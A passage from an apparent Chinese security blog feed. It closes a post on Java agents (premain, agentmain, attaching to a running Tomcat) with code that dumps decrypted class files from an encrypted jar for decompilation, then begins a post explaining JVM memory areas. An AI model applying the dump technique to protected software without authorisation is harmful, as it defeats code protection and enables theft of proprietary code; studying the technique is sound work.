class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreMainTraceAgent</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"agentArgs : "</span> + agentArgs);</span><br><span class="line">    inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException&#123;</span><br><span class="line">      System.out.println(<span class="string">"premain load Class:"</span> + className);</span><br><span class="line">      <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件META-INF/MANIFEST.MF:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: main.java.mi1k7eatest.PreMainTraceAgent</span><br></pre></td></tr></table></figure><p>Premain-Class用于指定上面的premain函数所在的Class。</p><p>然后在启动java服务的时候添加启动参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:mi1k7ea.jar=123</span><br></pre></td></tr></table></figure><h3 id="使用agentmain-在主程序运行之后代理"><a href="#使用agentmain-在主程序运行之后代理" class="headerlink" title="使用agentmain()在主程序运行之后代理"></a>使用agentmain()在主程序运行之后代理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args,Instrumentation inst)</span></span>&#123;</span><br><span class="line">    Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">    <span class="keyword">for</span>(Class&lt;?&gt;[] cls:classes)&#123;</span><br><span class="line">        System.out.println(cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"Finished"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在程序运行后加载，编写加载agent类的程序。因为如果选择agentmain的写法，运行时主程序已经加载了，所以我们不能再在程序中编写加载的代码，只能另写程序。</p><p>那么另写程序如何与主程序进行通信？</p><p>这里用到的机制就是attach机制，它可以将JVM A连接至JVM B，并发送指令给JVM B执行，JDK自带常用工具如jstack，jps等就是使用该机制来实现的。</p><p>这里我们先用tomcat启动一个程序我们称为主程序B</p><p>然后再来写A程序代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        VirtualMachine vm = VirtualMachine.attach(<span class="string">"78256"</span>);</span><br><span class="line">        vm.loadAgent(<span class="string">"/home/mi1k7ea.jar"</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码将mi1k7ea.jar连接到tomcat的78256进程上</p><p>查看tomcat的控制台，就会发现已经执行了mi1k7ea.jar的代码，有相应的输出内容。</p><h2 id="0x05-实例——Dump加密class源码"><a href="#0x05-实例——Dump加密class源码" class="headerlink" title="0x05 实例——Dump加密class源码"></a>0x05 实例——Dump加密class源码</h2><p>现在假设有个ClassEncode_encrypt.jar文件，其中的com.mi1k7ea包下的class文件都被加密处理了，直接用反编译工具是没办法反编译成功的。但由于该jar文件在运行时需要加载特定的so文件来在加密的class文件中字节码执行之前先进行解码操作，因此我们可以使用JavaAgent来实现在目标class文件内容被解码后且执行前将其class文件源码dump下来。</p><p>具体场景参考：<a href="/2020/05/01/Java代码反反编译思路/">Java代码反反编译对抗思路</a></p><p>这里我们选择在主程序运行之前进行代理，即编写premain()函数。</p><p>MainAgent.java，定义了premain()函数，其中调用了Instrumentation类的addTransformer()函数来添加一个类文件转换器实例，该实例类型为后面定义的DumpClassTransformer类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DumpClassTransformer());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DumpClassTransformer.java，实现instrument提供的ClassFileTransformer接口，定义了一个transform()方法，该方法会在类文件被加载时调用，而在该方法中会将已经解码的class文件字节码写入目标文件中保存：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DumpClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DUMP_PACKAGE = System.getProperty(<span class="string">"dump_package"</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String OUT_FOLDER = System.getProperty(<span class="string">"dump_out_folder"</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classfileBuffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String tmpClassName = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmpClassName.startsWith(DUMP_PACKAGE)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writeClass(className, classfileBuffer);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">writeClass</span><span class="params">(String className, <span class="keyword">byte</span>[] classfileBuffer)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String folder = OUT_FOLDER;</span><br><span class="line">            <span class="keyword">if</span> (!folder.endsWith(File.separator)) &#123;</span><br><span class="line">                folder = folder + File.separator;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String classPath = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="string">"/"</span>));</span><br><span class="line">            className = className.substring(className.lastIndexOf(<span class="string">"/"</span>) + <span class="number">1</span>, className.length());</span><br><span class="line"></span><br><span class="line">            String path = OUT_FOLDER + File.separator + classPath;</span><br><span class="line">            file = <span class="keyword">new</span> File(path);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            file = <span class="keyword">new</span> File(path + File.separator + className + <span class="string">".class"</span>);</span><br><span class="line"></span><br><span class="line">            fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fileOutputStream.write(classfileBuffer);</span><br><span class="line"></span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    fileOutputStream.close();</span><br><span class="line">                    fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件META-INF/MANIFEST.MF，Premain-Class用于指定上面的premain()函数所在的Class，注意最后必须空一行出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.dumpclass.MainAgent</span><br></pre></td></tr></table></figure><p>打包成DumpClass.jar。</p><p>通过以下命令，指定JavaAgent的jar包，然后在目标jar包主执行类方法执行之前先执行DumpClass.jar中的premain()方法，从而从内存将加密的目标jar类的字节码Dump下来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Ddump_package=com.mi1k7ea -Ddump_out_folder=/tmp -agentlib:decrypt -javaagent:DumpClass.jar -jar ClassEncode_encrypt.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/6.png" alt=""></p><p>下载下来，此时就能从成功反编译获取到加密class文件的内容了：</p><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/7.png" alt=""></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.cnblogs.com/kokov/p/12120033.html" target="_blank" rel="noopener">java agent技术原理及简单实现</a></p><p><a href="https://www.cnblogs.com/paul-blog/p/11048094.html" target="_blank" rel="noopener">字节码插桩技术</a></p><p><a href="http://rui0.cn/archives/1063" target="_blank" rel="noopener">插桩技术在Java安全中的应用简述</a></p><p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/" target="_blank" rel="noopener">Java SE 6 新特性：Instrumentation 新功能</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-Java-Instrument&quot;&gt;&lt;a href=&quot;#0x01-Java-Instrument&quot; class=&quot;headerlink&quot; title=&quot;0x01 Java Instrument&quot;&gt;&lt;/a&gt;0x01 Java Instrument&lt;/h2&gt;&lt;
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析JVM</title>
    <link href="https://www.mi1k7ea.com/2020/05/08/%E6%B5%85%E6%9E%90JVM/"/>
    <id>https://www.mi1k7ea.com/2020/05/08/浅析JVM/</id>
    <published>2020-05-08T14:47:34.000Z</published>
    <updated>2020-05-08T15:10:12.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文直接参考或引自网上文章。</p><h2 id="0x01-JVM简介"><a href="#0x01-JVM简介" class="headerlink" title="0x01 JVM简介"></a>0x01 JVM简介</h2><p>JVM是Java Virtual Machine（Java虚拟机）的缩写，JVM是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。</p><p>引入Java语言虚拟机后，Java语言在不同平台上运行时不需要重新编译。Java语言使用Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。</p><p>Java虚拟机有自己完善的硬件架构，如处理器、堆栈等，还具有相应的指令系统。</p><p>Java虚拟机本质上就是一个程序，当它在命令行上启动的时候，就开始执行保存在某字节码文件中的指令。Java语言的可移植性正是建立在Java虚拟机的基础上。任何平台只要装有针对于该平台的Java虚拟机，字节码文件（.class）就可以在该平台上运行。这就是“一次编译，多次运行”。</p><p>Java虚拟机不仅是一种跨平台的软件，而且是一种新的网络计算平台。该平台包括许多相关的技术，如符合开放接口标准的各种API、优化技术等。Java技术使同一种应用可以运行在不同的平台上。Java平台可分为两部分，即Java虚拟机（Java virtual machine，JVM）和Java API类库。</p><p>JVM特性：</p><ul><li>移植性：无论是GC还是Hotspot都可以用在任何Java可用的地方。比方说，JRuby可以运行在其他平台上，Rails应用就可以运行在IBM主机上的JRuby上，而且这台IBM主机运行的是CP/CMS.实际上，由于Java和OpenJDK项目的开源，我们正在看到越来越多的平台的衍生，因此JVM的移植性也将越来越棒。</li><li>成熟：JVM已有多年的历史，在过去的这些年里，许多开发者为它做出了许多贡献，使得它的性能一次又一次地提升，让JVM变得更加稳定、快速和广泛。</li><li>覆盖面：JRuby和JVM上的其他语言项目已经被承认，一个例子是invokedynamic specification（akaJSR292）。JSR越来越配合新的语言，JVM已不再是Java一个人定制规则。JVM正在构建成为类如JRuby等项目的优良平台。还有一个MLVM（multiple languageVM）项目，好比是新特性的清算机构，是一个许多企业应用的开发者试图添加应用的地方，而这些应用正是他们想在JVM中看到的。而且JVM开发者互相协作、彼此影响，无疑这有利于JVM新特性的诞生。这些细节都可以看到JVM正在关注开发者的需求，扩大他的覆盖面。</li></ul><h2 id="0x02-体系结构"><a href="#0x02-体系结构" class="headerlink" title="0x02 体系结构"></a>0x02 体系结构</h2><p>Java虚拟机主要分为五大模块：类装载器子系统、运行时数据区、执行引擎、本地方法接口和垃圾收集模块。其中垃圾收集模块在Java虚拟机规范中并没有要求Java虚拟机垃圾收集，但是在没有发明无限的内存之前，大多数JVM实现都是有垃圾收集的。而运行时数据区都会以某种形式存在于每一个JAVA虚拟机实例中，但是Java虚拟机规范对它的描述却是相当抽象。这些运行时数据结构上的细节，大多数都由具体实现的设计者决定。</p><p>Java虚拟机不是真实的物理机，它没有寄存器，所以指令集是使用Java栈来存储中间数据，这样做的目的就是为了保持Java虚拟机的指令集尽量的紧凑，同时也便于JAVA虚拟机在那些只有很少通用寄存器的平台上实现。另外，JAVA虚拟机的这种基于栈的体系结构，有助于运行时某些虚拟机实现的动态编译器和即时编译器的代码优化。</p><p>下面对JVM体系结构中的五大模块分别进行说明。</p><h2 id="0x03-运行时数据区"><a href="#0x03-运行时数据区" class="headerlink" title="0x03 运行时数据区"></a>0x03 运行时数据区</h2><p>JVM体系结构如图：</p><p><img src="/2020/05/08/浅析JVM/1.png" alt=""></p><p>几个主要区域的特点归纳如下：</p><p><img src="/2020/05/08/浅析JVM/2.png" alt=""></p><p>各个空间的内存分配如下：</p><p><img src="/2020/05/08/浅析JVM/3.png" alt=""></p><h3 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h3><p>线程私有。</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>字节码解释器工作通过改变程序计数器的值来选取下一条需要执行的字节码指令。分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖程序计数器来完成。</p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>JVM的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，为了各条线程之间的切换后计数器能恢复到正确的执行位置，所以每条线程都会有一个独立的程序计数器。</p><p>当线程正在执行一个Java方法，程序计数器记录的是正在执行的JVM字节码指令的地址；如果正在执行的是一个Natvie（本地方法），那么这个计数器的值则为空（Underfined）。</p><p>程序计数器占用的内存空间很少，也是唯一一个在JVM规范中没有规定任何OutOfMemoryError（内存不足错误）的区域。</p><h3 id="Java虚拟机栈"><a href="#Java虚拟机栈" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h3><p>线程私有。</p><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>Java虚拟机栈保存内容：存储局部变量，操作数栈，动态链接，方法出口。</p><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>与程序计数器一样，Java虚拟机栈也是线程私有的，用通俗的话将它就是我们常常听说到堆栈中的那个“栈内存”。</p><p>虚拟机栈描述的是Java方法执行的内存模型：每个方法在执行的同时都会创建一个栈帧(Stack Frame)用于存储局部变量表（局部变量表需要的内存在编译期间就确定了所以在方法运行期间不会改变大小），操作数栈，动态链接，方法出口等信息。</p><p>栈是Java方法执行的内存模型：每个方法被执行的时候都会创建一个“栈帧”用于存储局部变量表(包括参数)、操作栈、方法出口等信息。每一个方法从调用至出栈的过程，就对应着栈帧在虚拟机中从入栈到出栈的过程。</p><p>栈的生命周期是跟随线程的生命周期，线程创建时创建，线程结束栈内存也就释放，是线程私有的。</p><p>本地方法栈和Java虚拟机栈的区别：Java虚拟机栈为虚拟机执行的Java方法服务，而本地方法栈则是为Native方法服务。</p><h4 id="保存具体内容"><a href="#保存具体内容" class="headerlink" title="保存具体内容"></a>保存具体内容</h4><p>如图：</p><p><img src="/2020/05/08/浅析JVM/6.png" alt=""></p><h5 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h5><p>局部变量表是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量。在Java程序被编译成Class文件时，就在方法的Code属性的max_locals数据项中确定了该方法所需要分配的最大局部变量表的容量。</p><p>局部变量表的容量以变量槽（Slot）为最小单位，32位虚拟机中一个Slot可以存放一个32位以内的数据类型（boolean、byte、char、short、int、float、reference和returnAddress八种）。</p><p>reference类型虚拟机规范没有明确说明它的长度，但一般来说，虚拟机实现至少都应当能从此引用中直接或者间接地查找到对象在Java堆中的起始地址索引和方法区中的对象类型数据。</p><p>returnAddress类型是为字节码指令jsr、jsr_w和ret服务的，它指向了一条字节码指令的地址。</p><p>虚拟机是使用局部变量表完成参数值到参数变量列表的传递过程的，如果是实例方法（非static），那么局部变量表的第0位索引的Slot默认是用于传递方法所属对象实例的引用，在方法中通过this访问。</p><p>Slot是可以重用的，当Slot中的变量超出了作用域，那么下一次分配Slot的时候，将会覆盖原来的数据。Slot对对象的引用会影响GC（要是被引用，将不会被回收）。</p><p>系统不会为局部变量赋予初始值（实例变量和类变量都会被赋予初始值）。也就是说不存在类变量那样的准备阶段。</p><h5 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h5><p>操作数栈和局部变量区一样，操作数栈也是被组织成一个以字长为单位的数组。但是和前者不同的是，它不是通过索引来访问，而是通过标准的栈操作——压栈和出栈来访问的。比如，如果某个指令把一个值压入到操作数栈中，稍后另一个指令就可以弹出这个值来使用。</p><p>虚拟机在操作数栈中存储数据的方式和在局部变量区中是一样的：如int、long、float、double、reference和returnType的存储。对于byte、short以及char类型的值在压入到操作数栈之前，也会被转换为int。</p><p>虚拟机把操作数栈作为它的工作区——大多数指令都要从这里弹出数据，执行运算，然后把结果压回操作数栈。比如，iadd指令就要从操作数栈中弹出两个整数，执行加法运算，其结果又压回到操作数栈中，看看下面的示例，它演示了虚拟机是如何把两个int类型的局部变量相加，再把结果保存到第三个局部变量的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">iload_0    // push the int in local variable 0 ontothe stack</span><br><span class="line">iload_1    //push the int in local variable 1 onto the stack</span><br><span class="line">iadd       // pop two ints, add them, push result</span><br><span class="line">istore_2   // pop int, store into local variable 2</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在这个字节码序列里，前两个指令iload_0和iload_1将存储在局部变量中索引为0和1的整数压入操作数栈中，其后iadd指令从操作数栈中弹出那两个整数相加，再将结果压入操作数栈。第四条指令istore_2则从操作数栈中弹出结果，并把它存储到局部变量区索引为2的位置。</p><p>下图详细表述了这个过程中局部变量和操作数栈的状态变化，图中没有使用的局部变量区和操作数栈区域以空白表示：</p><p><img src="/2020/05/08/浅析JVM/7.png" alt=""></p><h5 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h5><p>动态链接 : 虚拟机运行的时候，运行时常量池会保存大量的符号引用，这些符号引用可以看成是每个方法的间接引用。如果代表栈帧A的方法想调用代表栈帧B的方法，那么这个虚拟机的方法调用指令就会以B方法的符号引用作为参数，但是因为符号引用并不是直接指向代表B方法的内存位置，所以在调用之前还必须要将符号引用转换为直接引用，然后通过直接引用才可以访问到真正的方法。</p><p>如果符号引用是在类加载阶段或者第一次使用的时候转化为直接应用，那么这种转换成为静态解析。</p><p>如果是在运行期间转换为直接引用，那么这种转换就成为动态链接。</p><h5 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h5><p>方法的返回分为两种情况：</p><ul><li>一种是正常退出，退出后会根据方法的定义来决定是否要传返回值给上层的调用者。</li><li>一种是异常导致的方法结束，这种情况是不会传返回值给上层的调用方法。</li></ul><p>不过无论是那种方式的方法结束，在退出当前方法时都会跳转到当前方法被调用的位置。</p><ul><li>如果方法是正常退出的，则调用者的PC计数器的值就可以作为返回地址；</li><li>如果是因为异常退出的，则是需要通过异常处理表来确定。</li></ul><p>方法的一次调用就对应着栈帧在虚拟机栈中的一次入栈出栈操作，因此方法退出时可能做的事情包括：恢复上层方法的局部变量表以及操作数栈，如果有返回值的话，就把返回值压入到调用者栈帧的操作数栈中，还会把PC计数器的值调整为方法调用入口的下一条指令。</p><p>关于Java栈的更多解析可以查阅下文：<a href="https://www.jianshu.com/p/15932712fcb4" target="_blank" rel="noopener">https://www.jianshu.com/p/15932712fcb4</a></p><p><img src="/2020/05/08/浅析JVM/8.png" alt=""></p><h3 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h3><p>线程私有。</p><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>主要用于存储本地方法的局部变量表，本地方法的操作数栈等信息。</p><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>栈作为一种线性的管道结构，遵循先进后出的原则。当栈内的数据在超出其作用域后，会被自动释放掉。</p><p>本地方法栈是在程序调用或JVM调用本地方法接口（Native）时候启用。</p><p>本地方法栈和Java虚拟机栈的区别：Java虚拟机栈为虚拟机执行的Java方法服务，而本地方法栈则是为Native方法服务。</p><h3 id="Java堆（Heap）"><a href="#Java堆（Heap）" class="headerlink" title="Java堆（Heap）"></a>Java堆（Heap）</h3><p>各线程共享区域。</p><h4 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h4><p>Java堆是一个运行时的数据区，用来存储数据的单元，存放通过new关键字新建的对象和数组，对象从中分配内存。</p><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>在堆中声明的对象，是不能直接访问的，必须通过在栈中声明的指向该引用的变量来调用。引用变量就相当于是为数组或对象起的一个名称，以后就可以在程序中使用栈中的引用变量来访问堆中的数组或对象。</p><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>Java虚拟机所管理的内存中最大的一块。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。</li><li>此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例都在这里分配内存。几乎所有的对象实例以及数组都要在堆上分配。</li><li>Java堆是GC管理的区域，也称为GC堆。</li><li>Java堆中还细分为：新生代，老年代；再细分一点有Eden空间，From Survivor（sərˈvaɪvə(r)，幸存者）空间，To Survivor空间。</li></ul><h4 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h4><p>堆内存是所有线程共有的，可以分为两个部分：新生代和老年代、永久代(HotSpot有)。下图中的Perm代表的是永久代，但是注意永久代并不属于堆内存中的一部分，同时jdk1.8之后永久代也将被移除。</p><p><img src="/2020/05/08/浅析JVM/4.png" alt=""></p><h5 id="新生代"><a href="#新生代" class="headerlink" title="新生代"></a>新生代</h5><p>程序新创建的对象都是从新生代分配内存，新生代由Eden Space和两块相同大小的Survivor Space(通常又称S0和S1或From和To)构成。</p><p>可通过-Xmn参数来指定新生代的大小；也可以通过-XX:SurvivorRation来调整Eden Space及SurvivorSpace的大小。</p><ul><li><p>新生代的初始值NewSize默认为1M，最大值需要设置，可以通过参数-XX:NewSize和-XX:MaxNewSize或-Xmn进行设置；</p></li><li><p>为老年代与新生代的大小比值，默认为2：1；</p></li><li><p>SurvivorRatio为新生代中Eden和Survivor的大小比值，默认为8：1</p><p>Edem : from : to = 8 :1 : 1</p><p>可以通过参数-XX:SurvivorRatio来设定，即： Eden = 8/10 的新生代空间大小，from = to = 1/10 的新生代空间大小。</p></li></ul><p>JVM每次只会使用Eden和其中的一块Survivor区域来为对象服务，所以无论什么时候，总是有一块Survivor区域是空闲着的。</p><p>新生代实际可用的内存空间为 9/10 ( 即90%)的新生代空间。</p><p>Eden区 、From区 - Surivivor 0 、To 区 - Surivivor 